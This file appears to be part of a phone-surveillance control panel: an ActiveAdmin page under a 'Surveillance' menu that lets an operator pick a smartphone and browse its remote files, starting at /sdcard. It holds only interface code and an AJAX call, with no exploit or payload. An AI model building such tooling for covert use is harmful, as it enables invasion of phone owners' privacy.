ActiveAdmin.register_page "File Browser" do
  menu parent: "👁 Surveillance", priority: 11, label: "📁 File Browser"

  content do
    div class: "file-browser-page", style: "padding: 20px; background: #161b22; min-height: 80vh;" do
      h2 "📁 Remote File Browser", style: "color: #00ff41; margin-bottom: 20px;"

      # Device selector
      smartphones = Smartphone.all
      div style: "margin-bottom: 20px;" do
        label "📱 Device: ", style: "color: #b0bec5; margin-right: 10px;"
        select id: "file-device-select", style: "padding: 8px 12px; background: #1a1a2e; color: #e0e0e0; border: 1px solid #00ff41; border-radius: 4px;" do
          smartphones.each do |s|
            option s.name || "Device #{s.id}", value: s.id
          end
        end
      end

      # Path input
      div style: "margin-bottom: 20px; display: flex; gap: 10px;" do
        input id: "file-path-input", type: "text", value: "/sdcard", style: "flex: 1; padding: 10px; background: #0d1117; color: #e0e0e0; border: 1px solid #30363d; border-radius: 4px; font-family: monospace;"
        button "📂 Browse", id: "btn-browse", style: "padding: 10px 20px; background: #238636; color: white; border: none; border-radius: 4px; cursor: pointer;"
      end

      # File listing area
      div id: "file-listing", style: "background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 20px; min-height: 400px;" do
        para "Enter a path and click Browse to list files.", style: "color: #666; font-style: italic;"
      end
    end

    script do
      raw <<-JS
        $(document).ready(function() {
          $('#btn-browse').click(function() {
            var deviceId = $('#file-device-select').val();
            var path = $('#file-path-input').val();
            $.ajax({
              url: '/smartphones/browse_files',
              method: 'POST',
              data: { smartphone_id: deviceId, path: path },
              beforeSend: function() { $('#file-listing').html('<p style="color:#58a6ff;">Loading...</p>'); }
            });
          });
        });
      JS
    end
  end
end
